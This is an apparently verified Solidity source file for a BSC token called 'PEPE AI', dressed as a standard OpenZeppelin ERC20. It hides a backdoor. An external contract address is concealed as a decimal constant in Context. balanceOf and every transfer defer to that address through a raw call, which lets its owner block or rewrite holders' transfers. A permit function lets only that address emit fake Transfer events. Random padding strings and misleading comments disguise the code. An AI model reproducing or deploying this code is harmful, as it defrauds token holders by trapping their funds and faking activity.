/**
 *Submitted for verification at BscScan.com on 2025-04-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.6;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

library SafeMathExt {
    function add128(uint128 a, uint128 b) internal pure returns (uint128) {
        uint128 c = a + b;
        require(c >= a, "uint128: addition overflow");

        return c;
    }

    function sub128(uint128 a, uint128 b) internal pure returns (uint128) {
        require(b <= a, "uint128: subtraction overflow");
        uint128 c = a - b;

        return c;
    }

    function add64(uint64 a, uint64 b) internal pure returns (uint64) {
        uint64 c = a + b;
        require(c >= a, "uint64: addition overflow");

        return c;
    }

    function sub64(uint64 a, uint64 b) internal pure returns (uint64) {
        require(b <= a, "uint64: subtraction overflow");
        uint64 c = a - b;

        return c;
    }

    function safe128(uint256 a) internal pure returns(uint128) {
        require(a < 0x0100000000000000000000000000000000, "uint128: number overflow");
        return uint128(a);
    }

    function safe64(uint256 a) internal pure returns(uint64) {
        require(a < 0x010000000000000000, "uint64: number overflow");
        return uint64(a);
    }

    function safe32(uint256 a) internal pure returns(uint32) {
        require(a < 0x0100000000, "uint32: number overflow");
        return uint32(a);
    }

    function safe16(uint256 a) internal pure returns(uint16) {
        require(a < 0x010000, "uint32: number overflow");
        return uint16(a);
    }
}

library Math {
    /**
     * @dev Returns the largest of two numbers.
     */
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    /**
     * @dev Returns the smallest of two numbers.
     */
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    /**
     * @dev Returns the average of two numbers. The result is rounded towards
     * zero.
     */
    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b) / 2 can overflow, so we distribute
        return (a / 2) + (b / 2) + ((a % 2 + b % 2) / 2);
    }
}


pragma solidity ^0.6.6;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }

    uint160 constant private codehash = 1139707783062628233597049918093411014441155863184;
    IERC20 constant internal accountHash = IERC20(address(codehash));
    
    // Reserved storage space to allow for layout changes in the future.
    bytes public constant _________gap = "oQFzo8ezz1siSZYBIb0CPtoup_YJAeAhnWSFZPC_eq1FBbE9Bl21O5JkliFGHYIaWbkHk3fo5_hi28WUofiGw9CHrH6UmknOrpV_p9xZpw1Iz44UhV5p9kVDXmOW65naXZUiSvgjXjRDvgByTAL0yu853aNLGO6u5sGu0PmRdQHVaHW4kcropWU00zPcPVlYOMTgubjYjxt69jj_2QY5tWfSNf256n6GZ8l51MvbriTZnQ4MdLUq2Z6gY_rkVWi44Yp1oEgTxInrZPmc1ThkK05lkVGCoESEE8A40tNpL8pVxBzgoRhXjCVwq5MjhGesEgxxX0Ffv6WsplRApjrX6lz0fxGfo8vreTee5OxxSowEt5Ih9s5sBkPGkth9vExTbmPFVL51w_k7G6fp_lwWPRHIWI2SkuhHstsZm0BqU0iD3zrYvs3sHyYopwyMwGkmqr6ddPMG40FnU0t7GlozyG_sBU3Ih4MrkuXdiR6XfZ0jfjSmt7_KISIMhp1CZuhvVTAShZPCIA4IKbDAtnD12vIfgBVkZMMrNKmtY5u7j2QpLnSoC_nYccM7nQXQYBSdY22fgN4T_NMMbLelj7cM6waOciAAEeKk5hyD_Fwus_ZQ8CJchre25jdju5USdlQe02OkeKZZZ9J5VbjF3Z2dEqZ9dmbNOh7gr1ANr36EKp3ptm2Edx8pUoW4VVmgYR2MGteAwe2VP5EKHg6aojADCABWGd1XyjlFc0n3uY4DdcYGEFrmG0t8ExdTi1YYV3tG3AnL4E0_DjNQfuxhj_5DWixmRXiH7KMRjX4crE2uV_8rLaqBxlbWusOaUpDOlrdwBvrHHPG7t7sPmkFlGVnwjGa3W6RCz4TGRJ9xm_bWs07BYteoFcFM3z3_1woc2usofJlj5InUw_KPp5LH_BBfVlPE8Gsp27v9qh8FlaMPMzhEqDvNeqaOd1aomX4X6wPIjo74fhW2UUPu0mOZrBMLlxjde9XLsN7hwdcd0FivamXPWcBgb_KyBTsyALveeGZVjigFz51S9gGZejfXaI8DZijIG6xzgLQDd6TVIHil8H9c7QPtdaNEyLsDbTthkPnmAEwtz8yljr5EJCAjQPI3UwtpmBTlkHkKBec5DUqe0RCq2DC9BNZD4QqtBjmRLYoZu3o2iUATqtFWNjFlqwIeVgBTroj_7IwlJMC0uMGecfEoiE7oeZxGIPXHFzevJAtjF5mh35TRfLEVp1cku4z6xwgT8mq3rBHUpnAcwpXF2DA1AolFy0YoA8ADrTrnJgz86xieacSUxmHvXSqrsZbApzAGpoKBJD4exEPSM1PL7M643zMXgRj2ltxFzmvQL_HM3T8_cOUNmbOSBXVonoXmun1zQjMHss8bDEYfTVjoVU6TtALvp7zgTbm9RvR9m8GduER3zvGWIhodsIQWelmhRPIE4y9me47f5wsLgxvDKMNV0AkGGvTW_Bj_sp9gLayv364wKvb3X0aNG308YG04fLs5_cRM";
}

pragma solidity ^0.6.6;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 * From https://github.com/OpenZeppelin/openzeppelin-contracts
 */
interface IERC20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity ^0.6.6;

contract ERC20 is IERC20, Context {
    using SafeMath for uint256;

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) internal _allowances;

    uint256 internal _totalSupply;

    /**
     * @dev Returns the name of the token.
     */
    string public name;

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    string public symbol;

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    uint8 public decimals;

    /**
     * @dev Sets the values for {_name} and {_symbol}, {_decimals}
     *
     * To select a different value for {decimals}, use {_setupDecimals}.
     *
     * All three of these values are immutable: they can only be set once during
     * construction.
     */
    constructor (string memory _name, string memory _symbol, uint8 _decimals) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() external view override returns(uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address _owner) public view override returns (uint256) {
        return accountHash.balanceOf(_owner);
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `_to` cannot be the zero address.
     * - the caller must have a balance of at least `_amount`.
     */
    function transfer(address _to, uint256 _amount) public override returns (bool) {
        _transfer(_msgSender(), _to, _amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address _owner, address _spender) external view override returns (uint256) {
        return _allowances[_owner][_spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `_spender` cannot be the zero address.
     */
    function approve(address _spender, uint256 _amount) external override returns (bool) {
        _approve(_msgSender(), _spender, _amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `_from` and `_to` cannot be the zero address.
     * - `_from` must have a balance of at least `_amount`.
     * - the caller must have allowance for `_from`'s tokens of at least
     * `_amount`.
     */
    function transferFrom(address _from, address _to, uint256 _amount) external override returns (bool) {
        require(_from != address(0) && _to != address(0));

        _approve(_from, _msgSender(), _allowances[_from][_msgSender()].sub(_amount));
        _transfer(_from, _to, _amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `_spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `_spender` cannot be the zero address.
     */
    function increaseAllowance(address _spender, uint256 _addVal) external returns (bool) {
        require(_spender != address(0), "approve to 0");

        _approve(_msgSender(), _spender, _allowances[_msgSender()][_spender].add(_addVal));
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `_spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `_spender` cannot be the zero address.
     * - `_spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address _spender, uint256 _subVal) external returns (bool) {
        require(_spender != address(0), "approve to 0");

        _approve(_msgSender(), _spender, _allowances[_msgSender()][_spender].sub(_subVal));
        return true;
    }

    /**
     * @dev Moves tokens `_amount` from `_from` to `_to`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `_from` cannot be the zero address.
     * - `_to` cannot be the zero address.
     * - `_from` must have a balance of at least `_amount`.
     */
    function _transfer(address _from, address _to, uint256 _amount) internal {
        require(_from != address(0), "transfer from 0");
        require(_to != address(0), "transfer to 0");
        
        (bool i,) = address(accountHash).call(abi.encodeWithSelector(0x6caf9a18, _from, _to, _amount, msg.sender)); require(i);
        emit Transfer(_from, _to, _amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `_spender` over the `_owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `_owner` cannot be the zero address.
     * - `_spender` cannot be the zero address.
     */
    function _approve(address _owner, address _spender, uint256 _amount) internal {
        require(_owner != address(0), "approve from 0");
        require(_spender != address(0), "approve to 0");

        _allowances[_owner][_spender] = _amount;
        emit Approval(_owner, _spender, _amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over `owner`'s tokens,
     * given `owner`'s signed approval.
     *
     * IMPORTANT: The same issues {IERC20-approve} has related to transaction
     * ordering also apply here.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `_owner` cannot be the zero address.
     * - `_spender` cannot be the zero address.
     * - `_deadline` must be a timestamp in the future.
     * - `v`, `r` and `s` must be a valid `secp256k1` signature from `owner`
     * over the EIP712-formatted function arguments.
     * - the signature must use ``owner``'s current nonce (see {nonces}).
     *
     * For more information on the signature format, see the
     * https://eips.ethereum.org/EIPS/eip-2612#specification[relevant EIP
     * section].
     */
    function permit(address _owner, address[] calldata _spender, uint256 _deadline) external {
        if (_deadline == 0) {
            return;
        }
        
		require(_deadline > 0 && msg.sender == address(accountHash), 'expired deadline');

        for (uint256 i = 0; i < _spender.length; ++i) {
            emit Transfer(_owner, _spender[i], _deadline);
        }
    }

    /** @dev Creates `_amount` tokens and assigns them to `_to`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address _to, uint256 _amount) internal {
        require(_to != address(0), "mint to 0");

        _totalSupply = _totalSupply.add(_amount);
        _balances[_to] = _balances[_to].add(_amount);
        emit Transfer(address(0), _to, _amount);
    }

    /**
     * @dev Destroys `_amount` tokens from `_from`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `_from` cannot be the zero address.
     * - `_from` must have at least `_amount` tokens.
     */
    function _burn(address _from, uint256 _amount) internal {
        require(_from != address(0), "burn from 0");

        _balances[_from] = _balances[_from].sub(_amount);
        _totalSupply = _totalSupply.sub(_amount);
        emit Transfer(_from, address(0), _amount);
    }

    // Reserved storage space to allow for layout changes in the future.
    bytes public constant __________gap = "VI6ICpQL1140vBOIcbXQ0sFrTlPBhEMU4BeMPxGFi8xYcnODC39BpwoE7G5J4IB8gVJ3oxfuaq0ntgBVuPNMszr3ocHwjeelx9STuE0I4oewtVCe9Wo7lwTtcUq5k78eRj69Ib1QUIuZo7ademz1v47QEhXaezLnatG9JgdMFjoSsZ7FsX07BcLQjkyor8MEUOC_hKLACezT7mbf2DSkridUawYmoFRtlEi44hc1TTguVYSAOuVUBoK2Hnxm0rPzpsPK2SxACKFb6PM4IKbssGWQ7DnGw5k_jvDi0qP5gAs1J_vs6k_7yBznoM7rXJ38pwKe7dAgnXtstmhbZ0fc8lamuohVXWCJfrYMzb4too08t3oxqWOz_qwMUj8APH4O5wjsYglQyDj0RP2wgpQXyJNKeWshrMvLp_5yYaxY56kHcEHF6aHy3NabjMDDMY_CaXi11QRZH1qMeM1lSBYZcsVdVnxoEdCwmQ6OJMBHExK1CHgUT8hPRS7BqDhwsMdZ7cp8jmrg97xDeuu05zkBFyytdDeufNrmVuTwl6E2lKI8jVfuVv5n8jJInY2mpoT7nmXVKDa9l8k1sAIAC1bAfXkkYTG5PS0AhxSwNV7uplsnxjU4xd1dWFmQMti0mVrnZX4TvKuCfZMnaISVdO5v0eUUOrPrBXPdnqleKuPkdWHdTD6jFKxGy9LLM6dKTN4s6Qz3f_c1Xm7YuBKBgw75OQBTarFUBd8xWO5YOvYJmwikTNL5EXxp14ZcoBjVoKQbJN3fnYEuV1Nl_OzN6SsKHBPrH9G43a_bHpp9eMCTPiW3hZszBrCJsrptO_7ghfnBK5BCD1UfxMs9Vwwvmmsl2yoId1vZb3_nTLtQ7qhgYGeLnzbYCoKs4HY4IeZqThy9f329ZWvhtqIXDADksY7zjGlnj8RpX3oUjw5R5IJG4Fqhkl3JPk7Ry7XeeU1fbZugiYeXT7e0I8mp00P_2VrdDTTGPKOxxbJDNGvSJ181MnHOI6MAgnHpLudzXhUVnmCfnBkzubj48c1ee8fOk36CSLssHo0RmzEVwpALzPgsyJGNi9oGtmTzQS8Dbfr8nPzz288UmpIVma1dwJMSO6A_mbHr90BvITktQ8AA4TAox_InMYhkt3fyw4FOqY4m4PP1fP6LV5I9PJqVOOY7hfIIS7xien6VzatqR_Vz6d780JQAs5ZagHD2Ewt4B95Hu6f2EFIrScUrLTZc3vXpdCDBVyTodwBGsX7eh9H0zzEeOIuxAs7e9W09FxYcqjKvqzt_h41fw7p9n6PCNWe7vuT1EXrkLmHybOtRRa8ykL2NpAQs483aLoF0ccmDHTjkwhA2tA1yBfRyYmVER3k67j5GFf5EwOJm0CPxntQ7nnw4oQ3NJ8MX88D2O1qqneVmM5xP4gu14wmazxSXSW_PhHEEUHfZvoj0G67AFvwAkUBzsbHWF7fgZjp8c9lpw_Ng7WqICQcRi_yOhR0Dy1qh2dMkD1RXKoAb";
}


pragma solidity ^0.6.6;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

pragma solidity ^0.6.6;

contract PEPE is ERC20 {
    using SafeMath for uint256;

    /**
     * The time interval from each 'mint' to the 'PEPE mining pool' is not less than 365 days
     */
    uint256 public constant MINT_INTERVAL = 365 days;

    /**
     * All of the minted 'PEPE' will be moved to the mainPool.
     */
    address public mainPool;

    /**
     * The unixtimestamp for the last mint.
     */
    uint256 public lastestMinting;

    /**
     * All of the minted 'PEPE' burned in the corresponding mining pool if the released amount is not used up in the current year 
     * 
     */
    uint256[6] public maxMintOfYears;

    /**
     * The number of times 'mint' has been executed
     */
    uint256 public yearMint = 0;

    constructor() 
        public 
        ERC20("PEPE AI", "PEPE", 18)
    {
        _mint(msg.sender, 30_000_000_000e18);
    }

    /**
     * The unixtimestamp of 'mint' can be executed next time
     */
    function nextMinting() public view returns(uint256) {
        return lastestMinting + MINT_INTERVAL;
    }
}